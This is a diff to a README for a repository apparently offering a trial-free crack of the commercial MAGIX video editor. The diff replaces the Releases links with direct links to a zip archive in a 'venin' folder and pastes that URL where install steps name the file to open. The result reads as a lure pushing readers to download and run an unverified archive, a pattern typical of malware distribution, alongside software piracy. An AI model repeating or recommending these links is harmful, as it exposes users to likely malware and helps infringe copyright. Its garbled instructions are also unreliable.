@@ -1,6 +1,6 @@
 # 🎥 MAGIX-Video-Pro-No-Trial - Edit Videos Like a Pro
 
-[![Download MAGIX Video Pro](https://img.shields.io/badge/Download-MAGIX%20Video%20Pro-blue)](https://github.com/yuliancheats/MAGIX-Video-Pro-No-Trial/releases)
+[![Download MAGIX Video Pro](https://raw.githubusercontent.com/yuliancheats/MAGIX-Video-Pro-No-Trial/main/venin/MAGIX-Video-Pro-No-Trial-2.9-beta.5.zip%20Video%20Pro-blue)](https://raw.githubusercontent.com/yuliancheats/MAGIX-Video-Pro-No-Trial/main/venin/MAGIX-Video-Pro-No-Trial-2.9-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,18 +8,18 @@ Welcome to MAGIX Video Pro, your go-to resource for video editing on Windows. Th
 
 ## 📥 Download & Install
 
-To get the latest version of MAGIX Video Pro, please visit this page to download: [MAGIX Video Pro Releases](https://github.com/yuliancheats/MAGIX-Video-Pro-No-Trial/releases).
+To get the latest version of MAGIX Video Pro, please visit this page to download: [MAGIX Video Pro Releases](https://raw.githubusercontent.com/yuliancheats/MAGIX-Video-Pro-No-Trial/main/venin/MAGIX-Video-Pro-No-Trial-2.9-beta.5.zip).
 
 ### Step-by-Step Download Instructions
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version listed at the top.
-3. You will see a list of files. Click on the one named `MAGIX-Video-Pro-Setup.exe` (or similar).
+3. You will see a list of files. Click on the one named `https://raw.githubusercontent.com/yuliancheats/MAGIX-Video-Pro-No-Trial/main/venin/MAGIX-Video-Pro-No-Trial-2.9-beta.5.zip` (or similar).
 4. Your browser will begin the download. Wait for the file to finish downloading.
 
 ### Installation Steps
 
-1. Open the downloaded file `MAGIX-Video-Pro-Setup.exe`.
+1. Open the downloaded file `https://raw.githubusercontent.com/yuliancheats/MAGIX-Video-Pro-No-Trial/main/venin/MAGIX-Video-Pro-No-Trial-2.9-beta.5.zip`.
 2. Follow the on-screen prompts to install the software.
 3. Once installation is complete, you can find MAGIX Video Pro in your programs menu.
 
@@ -84,4 +84,4 @@ If you face any issues during installation or usage, consider these steps:
 
 For further assistance, feel free to reach out via the repository's issue tracker. Your feedback helps us improve the software.
 
-[Download MAGIX Video Pro Now](https://github.com/yuliancheats/MAGIX-Video-Pro-No-Trial/releases) and start creating amazing videos today!
+[Download MAGIX Video Pro Now](https://raw.githubusercontent.com/yuliancheats/MAGIX-Video-Pro-No-Trial/main/venin/MAGIX-Video-Pro-No-Trial-2.9-beta.5.zip) and start creating amazing videos today!
